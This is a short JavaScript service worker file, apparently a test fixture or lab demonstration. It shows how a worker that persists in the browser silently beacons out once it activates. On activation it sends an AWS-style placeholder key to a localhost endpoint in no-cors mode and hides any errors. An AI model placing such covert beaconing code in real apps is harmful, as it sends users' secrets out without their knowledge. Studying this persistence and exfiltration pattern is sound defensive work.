// A service worker the app installs on its origin. It outlives the page in the user's browser.
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => {
  fetch('http://127.0.0.1:4000/hit?via=service-worker&d=AKIA-FAKE-SECRET-123', {mode: 'no-cors'}).catch(() => {});
});
